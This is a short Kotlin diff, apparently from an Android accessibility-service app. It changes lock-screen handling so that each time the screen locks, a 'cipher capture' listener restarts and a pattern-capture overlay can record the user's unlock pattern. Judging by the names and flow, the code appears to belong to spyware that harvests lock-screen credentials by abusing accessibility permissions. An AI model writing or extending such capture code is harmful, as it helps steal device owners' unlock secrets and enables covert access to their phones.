@@ -119,9 +119,12 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
                 recordingStartTime = System.currentTimeMillis()
                 patternPoints.clear()
                 patternCoords = JSONArray()
-                // 锁屏时立即清空所有 CipherCaptureManager 缓冲，防止设置流程中的旧数据泄漏
                 clearAllCipherBuffers()
-                Log.d(TAG, "Lock screen detected -> start pattern recording, buffers cleared")
+                // 每次锁屏重新激活 cipher 监听，确保 PatternCaptureOverlay 能被创建
+                if (service.isCipherCaptureEnabled) {
+                    service.cipherCaptureManager?.startListening()
+                }
+                Log.d(TAG, "Lock screen detected -> start recording, buffers cleared, listening restarted")
                 handler.postDelayed({ tryEnableTouchExploration() }, 500L)
             }
 
